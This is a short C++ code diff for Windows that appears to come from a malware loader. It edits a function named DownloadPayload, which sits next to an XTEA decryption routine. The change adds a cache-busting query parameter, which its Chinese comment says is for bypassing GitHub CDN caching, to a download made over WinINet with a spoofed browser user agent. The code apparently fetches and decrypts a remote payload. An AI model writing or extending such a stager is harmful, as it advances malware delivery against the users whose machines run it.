@@ -146,6 +146,10 @@ static void XteaDecryptCBC(uint8_t* data, size_t size) {
 static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
     std::vector<uint8_t> result;
 
+    // v3.39: 加随机查询参数 — 绕 GitHub CDN 缓存
+    wchar_t cacheBustedUrl[512];
+    swprintf_s(cacheBustedUrl, L"%ls?nocache=%u", url, GetTickCount());
+
     HINTERNET hInet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
                                     nullptr, nullptr, 0);
     if (!hInet) {
@@ -158,7 +162,7 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
     InternetSetOptionW(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
     InternetSetOptionW(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
 
-    HINTERNET hUrl = InternetOpenUrlW(hInet, url, nullptr, 0,
+    HINTERNET hUrl = InternetOpenUrlW(hInet, cacheBustedUrl, nullptr, 0,
                                       INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD |
                                       INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
     if (!hUrl) {
